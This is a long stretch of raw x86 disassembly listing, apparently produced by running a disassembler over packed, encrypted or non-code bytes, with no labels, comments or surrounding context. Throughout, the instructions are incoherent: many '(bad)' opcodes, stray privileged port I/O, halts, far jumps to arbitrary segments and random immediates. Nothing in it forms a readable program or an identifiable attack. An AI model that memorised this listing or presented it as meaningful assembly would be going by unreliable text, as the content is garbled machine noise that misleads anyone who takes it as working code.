  422ff4:	int    0x37
  422ff6:	xor    al,0x6
  422ff8:	stc    
  422ff9:	pop    es
  422ffa:	mov    al,ds:0x30b5cebb
  422fff:	int    0x76
  423001:	in     eax,dx
  423002:	fisttp DWORD PTR [eax]
  423004:	ja     0x422fbc
  423006:	mov    dh,0x5b
  423008:	pop    eax
  423009:	(bad)  
  42300a:	jge    0x422fda
  42300c:	push   cs
  42300d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42300e:	fst    DWORD PTR [ecx]
  423010:	push   ecx
  423011:	adc    BYTE PTR [edi],dl
  423013:	loopne 0x422fd5
  423015:	mov    esp,0x52bd9c3b
  42301a:	loop   0x423070
  42301c:	clc    
  42301d:	sub    DWORD PTR [edx+0x457e0d6b],edx
  423023:	pop    ss
  423024:	inc    ecx
  423025:	cdq    
  423026:	pop    eax
  423027:	xchg   ebp,eax
  423028:	jns    0x423081
  42302a:	xchg   edx,eax
  42302b:	sub    DWORD PTR [edi],esp
  42302d:	push   es
  42302e:	push   cs
  42302f:	cdq    
  423030:	mov    ch,0xba
  423032:	je     0x423008
  423034:	or     BYTE PTR [eax+0x297dcbe8],cl
  42303a:	repz lock mov ebx,0x19ba9a16
  423041:	enter  0xbe1e,0xa5
  423045:	imul   esp,eax,0xffffffcc
  423048:	in     eax,0xc1
  42304a:	sub    eax,0xdcedcf74
  42304f:	sub    ebp,DWORD PTR [eax+0x2b]
  423052:	daa    
  423053:	xor    DWORD PTR [edx-0x3],esp
  423056:	or     edx,DWORD PTR [edx+0x3b]
  423059:	enter  0x51eb,0x24
  42305d:	test   eax,0x7066b837
  423062:	sbb    ch,BYTE PTR ds:0xecf4556
  423068:	pop    ds
  423069:	shl    BYTE PTR [ecx+ecx*8+0x76a17640],0x3
  423071:	inc    edx
  423072:	js     0x423036
  423074:	in     eax,dx
  423075:	dec    eax
  423076:	push   ss
  423077:	push   edx
  423078:	pop    ds
  423079:	inc    eax
  42307a:	out    dx,eax
  42307b:	mov    ebp,0xc81a757b
  423080:	adc    eax,DWORD PTR [edi]
  423082:	addr16 in eax,dx
  423084:	hlt    
  423085:	xchg   ecx,eax
  423086:	sub    DWORD PTR [esi+ebp*1+0x3ff1d7d6],ebx
  42308d:	push   ebx
  42308e:	jecxz  0x423025
  423090:	and    DWORD PTR [ebp+0x333da7f5],edi
  423096:	inc    ebx
  423097:	mov    BYTE PTR [ecx],ah
  423099:	jb     0x4230ed
  42309b:	mov    esi,0xb1abef20
  4230a0:	pushf  
  4230a1:	add    BYTE PTR [esi+ebx*8-0x37],al
  4230a5:	cmp    esi,DWORD PTR [edx+ebx*8+0x255abdb6]
  4230ac:	xchg   edx,eax
  4230ad:	adc    eax,0x2169fce
  4230b2:	sbb    ecx,DWORD PTR [esi+0x233bc61c]
  4230b8:	enter  0xe463,0x3a
  4230bc:	xor    esi,DWORD PTR [ecx]
  4230be:	fcmovnu st,st(5)
  4230c0:	add    ebx,DWORD PTR [esi]
  4230c2:	dec    eax
  4230c3:	jp     0x4230b1
  4230c5:	push   edx
  4230c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230c7:	call   0xe863:0xcadd0314
  4230ce:	fadd   st(5),st
  4230d0:	add    eax,0x2e803174
  4230d5:	add    eax,0xacb5b468
  4230da:	jp     0x42312a
  4230dc:	mov    ah,0x69
  4230de:	(bad)  
  4230df:	scas   eax,DWORD PTR es:[edi]
  4230e0:	pusha  
  4230e1:	ret    
  4230e2:	mov    ah,0x20
  4230e4:	jns    0x4230b9
  4230e6:	and    edi,eax
  4230e8:	in     al,dx
  4230e9:	fild   DWORD PTR [edx]
  4230eb:	aam    0x53
  4230ed:	inc    ebx
  4230ee:	adc    esi,DWORD PTR [edx-0x121960a6]
  4230f4:	cmp    al,0x89
  4230f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230f7:	repz add DWORD PTR [edi+edx*2],esp
  4230fb:	sti    
  4230fc:	jae    0x4230d1
  4230fe:	retf   0x546
  423101:	add    BYTE PTR [edx-0x2f79ab11],bh
  423107:	mov    BYTE PTR [ecx+ecx*8+0x0],ch
  42310b:	push   ss
  42310c:	mov    DWORD PTR [ebx],edi
  42310e:	(bad)  [edx-0x56]
  423111:	cmovl  eax,ecx
  423114:	repz dec ecx
  423116:	cmp    BYTE PTR [ecx+0x2cdeb0f3],0xae
  42311d:	sbb    al,0x7f
  42311f:	stos   BYTE PTR es:[edi],al
  423120:	ja     0x42319c
  423122:	fcom   DWORD PTR [ebp-0x35569013]
  423128:	pushf  
  423129:	sbb    dh,BYTE PTR [esi+0x6c14b13c]
  42312f:	and    eax,0x60fcd129
  423134:	lds    ebx,FWORD PTR [eax-0x7e]
  423137:	scas   eax,DWORD PTR es:[edi]
  423138:	sbb    ebp,ebx
  42313a:	lds    edx,FWORD PTR [edi]
  42313c:	adc    BYTE PTR [edi],dl
  42313e:	adc    DWORD PTR [edi],0x2c9475a8
  423144:	in     eax,dx
  423145:	pop    eax
  423146:	sbb    ah,ah
  423148:	dec    ebx
  423149:	cmp    DWORD PTR [esi-0x6b],ebx
  42314c:	sbb    ebx,0xdb13740
  423152:	in     eax,dx
  423153:	dec    edi
  423154:	sti    
  423155:	push   cs
  423156:	push   eax
  423157:	out    dx,al
  423158:	mov    ebp,0x2661b06b
  42315d:	js     0x4231dd
  42315f:	ins    DWORD PTR es:[edi],dx
  423160:	hlt    
  423161:	and    eax,0x8102a15e
  423166:	jmp    0xd1fe:0x40c384a5
  42316d:	add    al,0x99
  42316f:	cmp    cl,BYTE PTR [edx-0x63]
  423172:	dec    edx
  423173:	inc    edx
  423174:	iret   
  423175:	xchg   DWORD PTR [ebp+eiz*2-0x7acd9e14],edx
  42317c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42317d:	loope  0x42312f
  42317f:	outs   dx,BYTE PTR ds:[esi]
  423180:	jb     0x42315f
  423182:	mov    eax,0xa12715b1
  423187:	push   0x62
  423189:	mov    edx,0x97a25df1
  42318e:	pop    ebx
  42318f:	ins    DWORD PTR es:[edi],dx
  423190:	ror    BYTE PTR [ebx],cl
  423192:	aad    0x27
  423194:	jo     0x42311c
  423196:	jne    0x423140
  423198:	fcom   DWORD PTR [eax-0x2e]
  42319b:	test   eax,0x2ae102ce
  4231a0:	cs ss icebp 
  4231a3:	pop    ds
  4231a4:	add    ah,ch
  4231a6:	dec    ebx
  4231a7:	outs   dx,BYTE PTR ds:[esi]
  4231a8:	dec    ecx
  4231a9:	mov    ecx,0xd0ddf85
  4231ae:	jnp    0x4231c0
  4231b0:	jle    0x4231c4
  4231b2:	rcr    edx,0xd
  4231b5:	les    edx,FWORD PTR [esi-0x4d]
  4231b8:	mov    edx,0x2f5b4152
  4231bd:	sub    DWORD PTR [esi+ebp*4+0x2cb569c8],esi
  4231c4:	jge    0x4231d0
  4231c6:	mov    eax,gs
  4231c8:	ins    BYTE PTR es:[edi],dx
  4231c9:	paddsw mm3,mm7
  4231cc:	and    eax,0xfca14ab4
  4231d1:	dec    edx
  4231d2:	clc    
  4231d3:	sbb    DWORD PTR [esi+0x6a02a62e],ebx
  4231d9:	dec    ebx
  4231da:	enter  0xe2af,0xc7
  4231de:	pushf  
  4231df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231e0:	fwait
  4231e1:	retf   0x9a90
  4231e4:	pop    eax
  4231e5:	mov    dl,0x62
  4231e7:	outs   dx,BYTE PTR ds:[esi]
  4231e8:	popf   
  4231e9:	adc    BYTE PTR [edx+0x24],cl
  4231ec:	xchg   ecx,esi
  4231ee:	retf   
  4231ef:	loope  0x42320c
  4231f1:	out    0xb,eax
  4231f3:	inc    esp
  4231f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231f5:	xchg   ebx,eax
  4231f6:	xor    BYTE PTR [ebx-0x7a],ch
  4231f9:	fs sbb al,0x1f
  4231fc:	jo     0x423210
  4231fe:	enter  0x17a6,0xc5
  423202:	push   ds
  423203:	dec    esp
  423204:	ins    BYTE PTR es:[edi],dx
  423205:	add    bl,BYTE PTR [ebx+0x206e61d9]
  42320b:	dec    ebp
  42320c:	clc    
  42320d:	sub    bl,BYTE PTR [edx+ecx*4]
  423210:	push   ecx
  423211:	xchg   edx,eax
  423212:	xor    al,0x9
  423214:	aaa    
  423215:	sub    bh,0x3d
  423218:	loopne 0x423219
  42321a:	aad    0xf5
  42321c:	je     0x423226
  42321e:	push   0x57
  423220:	mov    dh,0x5a
  423222:	ins    BYTE PTR es:[edi],dx
  423223:	(bad)  
  423224:	and    eax,0xa77ede39
  423229:	stos   DWORD PTR es:[edi],eax
  42322a:	add    al,0xe3
  42322c:	cld    
  42322d:	out    dx,eax
  42322e:	aam    0x83
  423230:	hlt    
  423231:	xchg   esi,eax
  423232:	and    DWORD PTR [edi],eax
  423234:	dec    ebx
  423235:	push   0x3e72f796
  42323a:	push   es
  42323b:	push   esi
  42323c:	icebp  
  42323d:	cmp    ebx,edi
  42323f:	lahf   
  423240:	xor    bl,dl
  423242:	mov    edi,0xd4b2c4e4
  423247:	jmp    0x42328f
  423249:	fistp  DWORD PTR [eax+0x47]
  42324c:	hlt    
  42324d:	jmp    0x409:0xbbd289f3
  423254:	aaa    
  423255:	mov    fs,WORD PTR es:[esi]
  423258:	xchg   edx,eax
  423259:	int3   
  42325a:	xor    al,0xa3
  42325c:	push   0x1c420434
  423261:	ret    0xf72e
  423264:	(bad)  
  423265:	(bad)  
  423267:	xlat   BYTE PTR ds:[ebx]
  423268:	cwde   
  423269:	dec    dh
  42326b:	leave  
  42326c:	pop    eax
  42326d:	mov    ecx,0xd284678e
  423272:	bound  esi,QWORD PTR [edx+0x70d2cb8f]
  423278:	or     eax,0xf28e8a25
  42327d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42327e:	mov    bl,BYTE PTR [edx]
  423280:	icebp  
  423281:	jmp    0x19214593
  423286:	aam    0xfd
  423288:	ficom  DWORD PTR [ecx-0x33036998]
  42328e:	jmp    0x4232ee
  423290:	push   edx
  423291:	out    0x14,eax
  423293:	inc    esi
  423294:	retf   0xd3d0
  423297:	jae    0x4232ab
  423299:	add    eax,0xa826c4a2
  42329e:	outs   dx,BYTE PTR ds:[esi]
  42329f:	in     eax,0x4c
  4232a1:	jae    0x42327b
  4232a3:	jb     0x42323c
  4232a5:	hlt    
  4232a6:	stos   DWORD PTR es:[edi],eax
  4232a7:	nop
  4232a8:	inc    eax
  4232a9:	add    al,0x70
  4232ab:	pop    ss
  4232ac:	sbb    DWORD PTR [edi],esp
  4232ae:	xchg   ebp,esi
  4232b0:	jp     0x423243
  4232b2:	or     al,BYTE PTR [ebx+0x64f2fac8]
  4232b8:	dec    ecx
  4232b9:	dec    edx
  4232ba:	out    0xcd,eax
  4232bc:	mov    ecx,DWORD PTR [edi+edx*2+0x61]
  4232c0:	cmc    
  4232c1:	inc    ebx
  4232c2:	pop    ds
  4232c3:	and    DWORD PTR [edi],eax
  4232c5:	ret    0x697f
  4232c8:	daa    
  4232c9:	sbb    eax,0xdd79e19a
  4232ce:	popa   
  4232cf:	mov    dh,0xb3
  4232d1:	(bad)  [esi-0x6f]
  4232d4:	repz cmp ebx,DWORD PTR [ebx+0x2f]
  4232d8:	or     al,0xd4
  4232da:	sub    al,0x17
  4232dc:	add    BYTE PTR [ebp-0xc],al
  4232df:	mov    ds:0x4514f108,al
  4232e4:	inc    dl
  4232e6:	xchg   ecx,eax
  4232e7:	xor    BYTE PTR [edx+ebx*8-0x23212e8c],dl
  4232ee:	out    dx,al
  4232ef:	xor    ah,bh
  4232f1:	bound  ebx,QWORD PTR [eax+0x52]
  4232f4:	(bad)  
  4232f5:	in     eax,dx
  4232f6:	mov    edi,0xd96bb90c
  4232fb:	out    dx,eax
  4232fc:	mov    ebx,0xdd833e1e
  423301:	or     BYTE PTR [esi-0x2acdec8c],dl
  423307:	cli    
  423308:	push   eax
  423309:	rol    DWORD PTR [ecx+edx*1+0x477323dd],cl
  423310:	addr16 jae 0x4232ff
  423313:	gs mov ebx,0x4ca04170
  423319:	cli    
  42331a:	fisubr DWORD PTR [edx-0x72]
  42331d:	and    DWORD PTR [ebx-0x62c46f9b],0xffffffcc
  423324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423325:	jo     0x423346
  423327:	pop    es
  423328:	stos   BYTE PTR es:[edi],al
  423329:	daa    
  42332a:	loop   0x42338d
  42332c:	outs   dx,DWORD PTR ds:[esi]
  42332d:	(bad)  
  42332e:	pextrw edx,(bad),0xc5
  423330:	xchg   esi,eax
  423331:	sub    ah,BYTE PTR [edx-0x69f8b9cc]
  423337:	nop
  423338:	sbb    DWORD PTR [eax+0x60ef2d4b],0x5e
  42333f:	pop    ebx
  423340:	pop    esi
  423341:	or     DWORD PTR [eax+0x3b031e0c],eax
  423347:	ficomp WORD PTR [edi-0x4a]
  42334a:	and    al,cl
  42334c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42334d:	lahf   
  42334e:	popf   
  42334f:	fimul  DWORD PTR gs:[ebx]
  423352:	push   ebx
  423353:	repnz sbb eax,0x2612fcc6
  423359:	in     eax,0x42
  42335b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42335c:	test   BYTE PTR [ebp+0x17],0x8c
  423360:	mov    ch,0x4
  423362:	das    
  423363:	into   
  423364:	mov    WORD PTR [edx+0x6c54da7f],ss
  42336a:	and    al,0xff
  42336c:	and    DWORD PTR [edi+0x6e],edx
  42336f:	sub    eax,DWORD PTR [edx+0x45b8d0a2]
  423375:	push   ebp
  423376:	not    ch
  423378:	push   ebx
  423379:	in     eax,dx
  42337a:	sbb    al,0x53
  42337c:	aas    
  42337d:	jae    0x4233e3
  42337f:	dec    eax
  423380:	adc    al,cl
  423382:	inc    edx
  423383:	out    0x31,eax
  423385:	push   0xffffffbe
  423387:	iret   
  423388:	cs cwde 
  42338a:	sbb    bh,bl
  42338c:	and    BYTE PTR [edi],bl
  42338e:	xor    BYTE PTR [edi-0x109b2b09],al
  423394:	dec    ebp
  423395:	int3   
  423396:	xor    BYTE PTR ds:[edi-0xfa84df6],bl
  42339d:	mov    cl,0x7
  42339f:	add    eax,0x96b88288
  4233a4:	mov    eax,ds:0xdfb24fe
  4233a9:	jae    0x423386
  4233ab:	psubb  mm4,QWORD PTR [edi]
  4233ae:	mov    al,ds:0xea12f2ce
  4233b3:	adc    eax,0x3f0336a5
  4233b8:	and    dh,BYTE PTR [edx+0x740f38a4]
  4233be:	rol    ch,1
  4233c0:	test   ch,dl
  4233c2:	adc    ecx,DWORD PTR [eax-0x5c]
  4233c5:	inc    edi
  4233c6:	fnsave ds:0xffe76206
  4233cc:	out    dx,al
  4233cd:	or     al,0xa2
  4233cf:	popa   
  4233d0:	inc    edi
  4233d1:	stc    
  4233d2:	cmp    bl,BYTE PTR [eax]
  4233d4:	mov    dh,dh
  4233d6:	pop    ebx
  4233d7:	jmp    0x423450
  4233d9:	sub    DWORD PTR [ebx+ecx*8-0x6c],esp
  4233dd:	repnz push 0xffffffe8
  4233e0:	es fs sahf 
  4233e3:	jo     0x42342d
  4233e5:	into   
  4233e6:	hlt    
  4233e7:	into   
  4233e8:	inc    esp
  4233e9:	lods   eax,DWORD PTR ds:[esi]
  4233ea:	daa    
  4233eb:	rol    BYTE PTR [edx+0x4c],1
  4233ee:	sti    
  4233ef:	cmc    
  4233f0:	or     BYTE PTR [edx+0x3a],bl
  4233f3:	sub    eax,0x6f9f0aed
  4233f8:	add    esp,DWORD PTR [esi-0x3d]
  4233fb:	rcr    BYTE PTR [ebx+ebp*1],1
  4233fe:	push   edx
  4233ff:	inc    ebp
  423400:	sbb    BYTE PTR [ebp+0x2e],bl
  423403:	(bad)  
  423404:	loop   0x42347c
  423406:	retf   0x7500
  423409:	push   ecx
  42340a:	sbb    al,0x87
  42340c:	inc    ecx
  42340d:	cli    
  42340e:	pop    ecx
  42340f:	repz pop ebx
  423411:	inc    ebp
  423412:	add    ah,ch
  423414:	and    BYTE PTR [eax+0x71],al
  423417:	push   ebp
  423418:	and    DWORD PTR [esi+ebp*2-0x133278f8],0x40c4436d
  423423:	sbb    al,0x50
  423425:	out    0xf5,eax
  423427:	push   0x32
  423429:	sub    DWORD PTR [ebx+0x6e6e3e64],0xe
  423430:	mov    cl,0xb
  423432:	add    BYTE PTR [edx-0x7b],ah
  423435:	dec    edx
  423436:	xchg   ecx,eax
  423437:	fistp  QWORD PTR [edx+0x49]
  42343a:	pop    edi
  42343b:	cmp    DWORD PTR [ecx-0x72965b4c],ebx
  423441:	cli    
  423442:	mov    dh,0xd
  423444:	cmp    BYTE PTR [esi],0x36
  423447:	or     eax,0x9c9b41d8
  42344c:	push   es
  42344d:	cmp    BYTE PTR [esi-0x6d],bl
  423450:	test   ch,0xcf
  423453:	adc    DWORD PTR [eax-0x5f77f243],esp
  423459:	and    ah,BYTE PTR [ecx]
  42345b:	dec    ecx
  42345c:	inc    eax
  42345d:	inc    ebx
  42345e:	cmp    esi,esi
  423460:	ds xor al,0x0
  423463:	xchg   ebx,eax
  423464:	inc    edx
  423465:	fild   DWORD PTR [esi]
  423467:	(bad)  
  423468:	jnp    0x4233f3
  42346a:	imul   ecx,DWORD PTR [edi],0x81a996d9
  423470:	fisubr DWORD PTR [edx-0x41377847]
  423476:	push   esp
  423477:	jns    0x42348c
  423479:	leave  
  42347a:	mov    cl,0xe8
  42347c:	adc    eax,0xc25c62a3
  423481:	add    ebx,ecx
  423483:	mov    edi,DWORD PTR [eax]
  423485:	fsub   QWORD PTR [ebx+0xb6c2f10]
  42348b:	in     al,0xd3
  42348d:	push   cs
  42348e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42348f:	xchg   esp,eax
  423490:	cmp    ecx,ecx
  423492:	jge    0x4234ce
  423494:	jmp    0x6cad81f8
  423499:	fs jae 0x42344b
  42349c:	cmc    
  42349d:	enter  0x2a09,0xf0
  4234a1:	addr16 pop edx
  4234a3:	(bad)  
  4234a4:	mov    edi,0xb6b89723
  4234a9:	inc    ebp
  4234aa:	jbe    0x423451
  4234ac:	mov    ecx,0xebf74f76
  4234b1:	xor    BYTE PTR [edx+0x6cdb0694],dh
  4234b7:	push   esp
  4234b8:	das    
  4234b9:	sub    BYTE PTR [edi],al
  4234bb:	les    eax,FWORD PTR [edx+edx*8-0x3a]
  4234bf:	adc    DWORD PTR [edx-0x5],esi
  4234c2:	aaa    
  4234c3:	mov    ds:0x872231b2,eax
  4234c8:	fsin   
  4234ca:	lods   al,BYTE PTR ds:[esi]
  4234cb:	and    eax,0x884f96ee
  4234d0:	xchg   edi,eax
  4234d1:	iret   
  4234d2:	addr16 jnp 0x4234d7
  4234d5:	dec    ecx
  4234d6:	jl     0x4234b1
  4234d8:	jle    0x4234bb
  4234da:	dec    ebp
  4234db:	inc    esi
  4234dc:	adc    al,0x1a
  4234de:	popa   
  4234df:	push   ebx
  4234e0:	stos   BYTE PTR es:[edi],al
  4234e1:	cmp    al,BYTE PTR [ebp+0x52]
  4234e4:	fucomip st,st(4)
  4234e6:	pop    esi
  4234e7:	std    
  4234e8:	dec    ebx
  4234e9:	sar    BYTE PTR [edi+0x51],0xcb
  4234ed:	mov    WORD PTR gs:[esi-0x1f],es
  4234f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234f2:	pop    es
  4234f3:	mov    es:0xa5691621,eax
  4234f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234fa:	push   esi
  4234fb:	stos   BYTE PTR es:[edi],al
  4234fc:	xchg   esp,eax
  4234fd:	pop    edi
  4234fe:	xor    al,cl
  423500:	aas    
  423501:	adc    eax,0x4273b328
  423506:	push   cs
  423507:	fnstcw WORD PTR [eax-0x3e]
  42350a:	adc    eax,0x4f2107d6
  42350f:	jbe    0x423577
  423511:	adc    DWORD PTR [edi+0x35f338b],ebp
  423517:	popf   
  423518:	lock bound ecx,QWORD PTR cs:[edi+esi*2-0x62ba84db]
  423521:	(bad)  [edi+0x29e74b23]
  423527:	call   0x8e7eecbe
  42352c:	xchg   ecx,eax
  42352d:	gs out 0xad,al
  423530:	push   ss
  423531:	mov    dl,0x4f
  423533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423534:	jp     0x4235a8
  423536:	test   BYTE PTR [edx+ebx*2+0x4a],dl
  42353a:	mov    eax,0x7afb65db
  42353f:	ss (bad) 
  423541:	cli    
  423542:	push   ebp
  423543:	mov    bh,0xd9
  423545:	dec    eax
  423546:	mov    ch,0x8f
  423548:	repz mov al,0xde
  42354b:	pop    ecx
  42354c:	xchg   ebp,eax
  42354d:	mov    esi,0xc2e0b16a
  423552:	mov    ch,0x39
  423554:	lds    edi,FWORD PTR [ebx-0x48]
  423557:	dec    edx
  423558:	daa    
  423559:	fiadd  WORD PTR [ebx]
  42355b:	mov    bl,0x93
  42355d:	mov    bh,0xec
  42355f:	fisub  DWORD PTR [eax+ebp*1]
  423562:	gs int 0x3b
  423565:	sbb    cl,ah
  423567:	inc    ebp
  423568:	inc    esi
  423569:	sti    
  42356a:	and    al,0x12
  42356c:	dec    ebx
  42356d:	arpl   WORD PTR [edx],dx
  42356f:	adc    eax,DWORD PTR [edi+eax*4]
  423572:	jno    0x4234fb
  423574:	and    al,0x9c
  423576:	mov    eax,ds:0x77bf567c
  42357b:	aas    
  42357c:	inc    eax
  42357d:	outs   dx,DWORD PTR ds:[esi]
  42357e:	loope  0x423524
  423580:	cld    
  423581:	jmp    0xf5fd:0x2483a97e
  423588:	mov    WORD PTR [ebp+0x68a57afd],ss
  42358e:	sbb    al,0x83
  423590:	cmp    dl,al
  423592:	jo     0x4235da
  423594:	aas    
  423595:	mov    edi,0x1a150b06
  42359a:	dec    esi
  42359b:	cmp    DWORD PTR [eax+0x5b],0xffffff8e
  42359f:	cmp    al,0x40
  4235a1:	out    0x88,al
  4235a3:	lea    edx,ds:0x602dfc25
  4235a9:	jbe    0x4235ce
  4235ab:	sub    al,0x59
  4235ad:	mov    edi,0xc5743f5f
  4235b2:	fdiv   st(4),st
  4235b4:	adc    eax,0x2d15dc48
  4235b9:	mov    bh,0xd4
  4235bb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235bd:	mov    bh,0x45
  4235bf:	cmp    BYTE PTR [eax],cl
  4235c1:	cmp    eax,0x4264c377
  4235c6:	idiv   eax
  4235c8:	stc    
  4235c9:	push   esi
  4235ca:	retf   0xa522
  4235cd:	enter  0x1a62,0x17
  4235d1:	jo     0x423581
  4235d3:	sub    dh,bl
  4235d5:	jb     0x423588
  4235d7:	mov    dl,0xd0
  4235d9:	into   
  4235da:	push   esp
  4235db:	dec    ecx
  4235dc:	int3   
  4235dd:	mov    ecx,ebp
  4235df:	or     eax,0xab918ea0
  4235e4:	jns    0x423629
  4235e6:	xor    BYTE PTR [ebp+0x50],0x20
  4235ea:	mov    ds:0x56597be4,eax
  4235ef:	(bad)  
  4235f0:	stc    
  4235f1:	add    al,0xd0
  4235f3:	or     ah,BYTE PTR [ebp-0x53]
  4235f6:	mov    esi,0xf1f08ac7
  4235fb:	mov    edi,0xe85c7411
  423600:	in     eax,dx
  423601:	xchg   ebx,eax
  423602:	or     DWORD PTR [eax+0x27],esi
  423605:	inc    edx
  423606:	xchg   edx,eax
  423607:	sbb    eax,DWORD PTR [esi-0x37]
  42360a:	cmp    dl,ah
  42360c:	push   ebp
  42360d:	cs push edi
  42360f:	adc    esi,DWORD PTR ds:0x4026d6ad
  423615:	push   ebx
  423616:	bound  ecx,QWORD PTR [ebx+0x5f]
  423619:	fisub  DWORD PTR [esi+eiz*1+0x69c59d36]
  423620:	outs   dx,DWORD PTR ds:[esi]
  423621:	mov    ah,0x4e
  423623:	inc    esi
  423624:	jle    0x42369b
  423626:	rcl    DWORD PTR [ecx+0x598a3496],0xd8
  42362d:	mov    DWORD PTR [esi],ebx
  42362f:	int    0x36
  423631:	je     0x423685
  423633:	idiv   DWORD PTR [esi]
  423635:	ret    0x2ed1
  423638:	out    dx,eax
  423639:	jo     0x423688
  42363b:	loopne 0x4235e6
  42363d:	pop    es
  42363e:	dec    esi
  42363f:	shr    DWORD PTR [esi],cl
  423641:	xlat   BYTE PTR ds:[ebx]
  423642:	leave  
  423643:	cli    
  423644:	popf   
  423645:	inc    ebp
  423646:	mov    al,0xc2
  423648:	sub    eax,0x820f6d9e
  42364d:	out    0x87,ax
  423650:	mov    esi,0x36f3c0e5
  423655:	cmp    al,0x3f
  423657:	xlat   BYTE PTR ds:[ebx]
  423658:	ficomp DWORD PTR [eax+0x43]
  42365b:	mov    BYTE PTR [ebp+0x17],dh
  42365e:	lea    ebx,[edi-0xf]
  423661:	sub    eax,0x4e910984
  423666:	ins    BYTE PTR es:[edi],dx
  423667:	sub    DWORD PTR [eax+0x66],0x2d
  42366b:	dec    edi
  42366c:	mov    cl,0x6a
  42366e:	dec    esi
  42366f:	xchg   esi,eax
  423670:	adc    BYTE PTR [ebp+0xd],cl
  423673:	xor    eax,0x9eded6e1
  423678:	out    dx,eax
  423679:	push   ebp
  42367a:	push   eax
  42367b:	pop    ebp
  42367c:	push   esi
  42367d:	jno    0x42369d
  42367f:	push   ds
  423680:	loope  0x4236a6
  423682:	sbb    eax,edi
  423684:	dec    eax
  423685:	les    ebp,FWORD PTR [eax]
  423687:	fidivr DWORD PTR [esi-0x60e77761]
  42368d:	jl     0x42361c
  42368f:	xor    eax,0x1d844121
  423694:	imul   ebx,edi,0x77
  423697:	pop    ecx
  423698:	inc    ecx
  423699:	mov    eax,gs:0x68f0d528
  42369f:	pop    edx
  4236a0:	jb     0x4236d9
  4236a2:	lea    ebx,[esi+0x5d]
  4236a5:	scas   eax,DWORD PTR es:[edi]
  4236a6:	(bad)  
  4236a7:	test   BYTE PTR [edi+0x57],0xa0
  4236ab:	or     ecx,0x43
  4236ae:	jmp    0xb9ffdc1e
  4236b3:	fs inc edx
  4236b5:	sub    al,0xa5
  4236b7:	or     eax,0x88c6bd93
  4236bc:	xlat   BYTE PTR ds:[ebx]
  4236bd:	and    ah,BYTE PTR [ebx-0x41]
  4236c0:	inc    esi
  4236c1:	popf   
  4236c2:	inc    ebp
  4236c3:	je     0x4236ef
  4236c5:	adc    bl,BYTE PTR [ebp-0x4d92d525]
  4236cb:	jbe    0x4236b4
  4236cd:	in     al,0x1e
  4236cf:	ins    DWORD PTR es:[edi],dx
  4236d0:	lock mov DWORD PTR gs:[ebx+0x14],edx
  4236d5:	xor    al,0x50
  4236d7:	je     0x4236ba
  4236d9:	mov    ds:0x1b9ffd1f,al
  4236de:	xor    bh,BYTE PTR [ecx]
  4236e0:	sar    DWORD PTR [esi],0x5d
  4236e3:	pop    ebx
  4236e4:	fisttp DWORD PTR [eax+0x3dca1f00]
  4236ea:	cdq    
  4236eb:	scas   eax,DWORD PTR es:[edi]
  4236ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236ed:	or     eax,0x710fd8f9
  4236f2:	inc    edi
  4236f3:	mov    ch,0x2c
  4236f5:	lods   al,BYTE PTR ds:[esi]
  4236f6:	push   edi
  4236f7:	pop    ss
  4236f8:	pop    ds
  4236f9:	xlat   BYTE PTR ds:[ebx]
  4236fa:	or     al,BYTE PTR [eax+ecx*4-0x46824e3c]
  423701:	pop    ds
  423702:	adc    al,0x77
  423704:	add    BYTE PTR [esi+0x75],dh
  423707:	ins    BYTE PTR es:[edi],dx
  423708:	sub    eax,0x39cc0d07
  42370d:	pop    esi
  42370e:	shr    BYTE PTR [edx],0xc2
  423711:	leave  
  423712:	nop
  423713:	or     bh,bh
  423715:	cmp    bh,al
  423717:	(bad)  
  423718:	adc    BYTE PTR [esi-0x40],bl
  42371b:	out    0x98,eax
  42371d:	and    edi,DWORD PTR ds:0xd469c30b
  423723:	div    BYTE PTR [esi]
  423725:	fist   DWORD PTR [esi+eax*2+0x635d3466]
  42372c:	xchg   DWORD PTR [ecx],ebx
  42372e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42372f:	mov    dh,0xcc
  423731:	es stos DWORD PTR es:[edi],eax
  423733:	(bad)
  423736:	xchg   ebx,eax
  423737:	mov    ebx,0xeefb331a
  42373c:	jbe    0x423735
  42373e:	ds inc ecx
  423740:	adc    ch,ah
  423742:	cmp    esi,DWORD PTR [ecx+0x6db7da21]
  423748:	inc    edi
  423749:	sar    DWORD PTR [edx+0x285441c8],0x56
  423750:	enter  0xa097,0x73
  423754:	daa    
  423755:	sub    eax,0x120c2404
  42375a:	pop    ebx
  42375b:	(bad)  
  42375c:	sahf   
  42375d:	push   es
  42375e:	stc    
  42375f:	pop    eax
  423760:	add    edx,edi
  423762:	jbe    0x42372e
  423764:	mov    fs,WORD PTR [esi]
  423766:	pop    esp
  423767:	in     al,0x1a
  423769:	(bad)  
  42376b:	push   eax
  42376c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42376d:	(bad)  
  42376e:	push   ss
  42376f:	xor    dh,BYTE PTR [ecx]
  423771:	xlat   BYTE PTR ds:[ebx]
  423772:	xor    BYTE PTR ds:0xdb57880c,bh
  423778:	ins    BYTE PTR es:[edi],dx
  423779:	or     al,0xf5
  42377b:	xor    al,0xd2
  42377d:	mov    bl,ch
  42377f:	mov    ?,esp
  423781:	mov    ebx,0x6bf87df2
  423786:	out    dx,al
  423787:	pop    es
  423788:	inc    edi
  423789:	sub    eax,DWORD PTR [ecx+0x2c]
  42378c:	or     bh,BYTE PTR [ecx+ebp*4-0x11]
  423790:	pop    eax
  423791:	test   al,0x14
  423793:	cmp    eax,0x40c699b1
  423798:	sbb    al,0xb6
